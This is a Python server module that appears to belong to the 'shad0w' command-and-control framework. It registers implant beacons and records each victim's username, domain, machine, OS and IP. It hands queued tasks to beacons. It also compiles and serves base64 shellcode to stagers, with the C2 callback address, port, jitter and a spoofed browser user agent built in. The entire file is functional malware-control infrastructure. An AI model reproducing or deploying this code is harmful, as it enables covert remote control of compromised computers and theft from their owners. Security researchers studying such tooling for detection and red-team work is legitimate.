import sys
import base64
from datetime import datetime

from lib import tools
from lib import buildtools
from .responce_builder import Builder

DATA_CMD_OUT = 0x2000
DATA_CMD_PRO = 0x3000
DO_CALLBACK  = 0x4000

class Handler(object):

    def __init__(self, shad0w):

        super(Handler, self).__init__()
        self.shad0w = shad0w

        # for building responces
        self.builder = Builder(shad0w)

    def task_beacon(self, request):

        # get the beacon id from the beacon

        # print(request.get_json(force=True))

        jdata = request.get_json(force=True)

        # print("jdata: ", jdata)

        beacon_id, opcode, data = tools.get_data_from_json(jdata)

        # only if were given an id by the beacon

        if beacon_id:

            # update the ping
            try:
                self.shad0w.beacons[beacon_id]["last_checkin"]     = str(datetime.now())
                self.shad0w.beacons[beacon_id]["last_checkin_raw"] = datetime.now()
            except KeyError: pass

            try:
                # if the beacon isnt just checking in to give us
                # data then build a responce to give the beacon

                if ((opcode == 0) and (data == "")):
                    # get the current task
                    tasklist = self.shad0w.beacons[beacon_id]["task"]
                    # build the responce
                    task     = self.builder.build(beacon_id=beacon_id, task=tasklist[0], args=tasklist[1])
                    # clear the task
                    self.shad0w.beacons[beacon_id]["task"] = None
                    # inform user
                    self.shad0w.debug.log(f"Beacon ({beacon_id}) received task", log=True)
                    return task

                # check if the data is for the current beacon
                if beacon_id == self.shad0w.current_beacon:
                    # check if we should display the data
                    callback = self.shad0w.beacons[beacon_id]["callback"]
                    return callback(self.shad0w, data)

                # another session has returned data
                if beacon_id != self.shad0w.current_beacon:
                    return task

            except:
                # there aint a task, so tell em that
                return self.builder.build(beacon_id=beacon_id, task=None)
        else:
            # ignore
            return self.builder.build(blank=True)

    def register_beacon(self, request):
            # register a new beacon
            # get the info from the initial request an store it
            # just ignore if the request isnt correct

            if request.method == "POST":

                username     = request.form.get("username")
                domain       = request.form.get("domain")
                machine      = request.form.get("machine")
                arch         = request.form.get("arch")
                opsystem     = request.form.get("os")
                secure       = request.form.get("secure")
                impersonate  = request.form.get("impersonate")

                if username and machine and domain:
                    beacon_id = tools.generate_beacon_id()

                    # init the new beacons dict
                    self.shad0w.beacons[beacon_id]                 = {}

                    # setup the file serve dict
                    self.shad0w.beacons[beacon_id]["serve"]        = {}

                    # add the ip to that dict
                    self.shad0w.beacons[beacon_id]["ip_addr"]      = request.remote_addr

                    # increase the beacon count + set beacon num
                    self.shad0w.beacon_count                       += 1
                    self.shad0w.beacons[beacon_id]["num"]          = self.shad0w.beacon_count

                    # store basic info about beacon
                    self.shad0w.beacons[beacon_id]["domain"]              = domain
                    self.shad0w.beacons[beacon_id]["machine"]             = machine
                    self.shad0w.beacons[beacon_id]["username"]            = username
                    self.shad0w.beacons[beacon_id]["arch"]                = arch
                    self.shad0w.beacons[beacon_id]["os"]                  = opsystem
                    self.shad0w.beacons[beacon_id]["impersonate"]         = None

                    # if we are impersonating a session then tell that beacon
                    if str(impersonate) != "None":
                        self.shad0w.beacons[impersonate]["impersonate"] = beacon_id

                    if secure == "SECURE":
                        self.shad0w.beacons[beacon_id]["secure"]       = True
                    else:
                        self.shad0w.beacons[beacon_id]["secure"]       = False

                    self.shad0w.beacons[beacon_id]["last_checkin"]     = str(datetime.now())
                    self.shad0w.beacons[beacon_id]["last_checkin_raw"] = datetime.now()

                    # send everytime it checks in, tells it whether to die of not
                    self.shad0w.beacons[beacon_id]["stay_alive"]   = True

                    # let the user know whats happening
                    if str(impersonate) == "None":
                        if domain != "NULL":
                            self.shad0w.debug.log(f"Beacon: {domain}\\{username}@{machine} (ARCH: {arch}, OS: {opsystem}, Type: {secure})", log=True)
                        else:
                            self.shad0w.debug.log(f"Beacon: {username}@{machine} (ARCH: {arch}, OS: {opsystem}, Type: {secure})", log=True)

                    # give the beacon there id, this is how we will identify them now
                    return self.builder.build(beacon_id=beacon_id, id=beacon_id)

                else:
                    self.shad0w.debug.log("invalid register request")
                    return self.builder.build(blank=True)

            else:
                self.shad0w.debug.log("invaild http method for register")
                return self.builder.build(blank=True)

    def stage_beacon(self, request):
        # this will be hit when a stager is requesting a beacon. We will need to parse
        # the request for the beacon and generate the correct one, once this is done we
        # will to to send it back to the stager.

        print("hit")

        # a stager should request a beacon via a post request
        if request.method == "POST":

            # get the payload from the request
            payload = request.form['payload']

            # get the variables for the make
            arch, platform, secure, static = buildtools.get_payload_variables(payload, warn=False)

            if secure != "secure":

                # copy the correct source files into build directory
                if static is not None:
                    # then we are building a static beacon
                    buildtools.clone_source_files(asm=True)
                if static is None:
                    # the we are building a stager
                    buildtools.clone_source_files(asm=True, rootdir="stager")

                # change the settings file based on the args we been given

                # these settings should be given by the stager in its request
                settings_template = """#define _C2_CALLBACK_ADDRESS L"%s"
    #define _C2_CALLBACK_PORT %s
    #define _CALLBACK_USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
    #define _CALLBACK_JITTER %s000
    """ % (self.shad0w.endpoint, self.shad0w.addr[1], 1)

                buildtools.update_settings_file(None, custom_template=settings_template)

                # now we need to run 'make' inside the cloned dir
                self.shad0w.debug.spinner(f"Preparing stage...")
                buildtools.make_in_clone(arch=arch, platform=platform, secure=secure, static=static)
                self.shad0w.debug.stop_spinner = True

                # get the shellcode from the payload
                rcode = buildtools.extract_shellcode(want_base64=True)

            else:
                rcode = base64.b64encode(self.shad0w.payloads["x64_secure_static"]["bin"]).decode()

            # give the shellcode to the stager
            self.shad0w.debug.log(f"Sending stage {self.shad0w.endpoint} --> {request.remote_addr} ({len(rcode)} bytes)", log=True)
            return rcode

        else:
            self.shad0w.debug.log("invaild http method for stager")
            return self.builder.build(blank=True)


    def blank_page(self):
        # does what the function says
        return self.builder.build(blank=True)
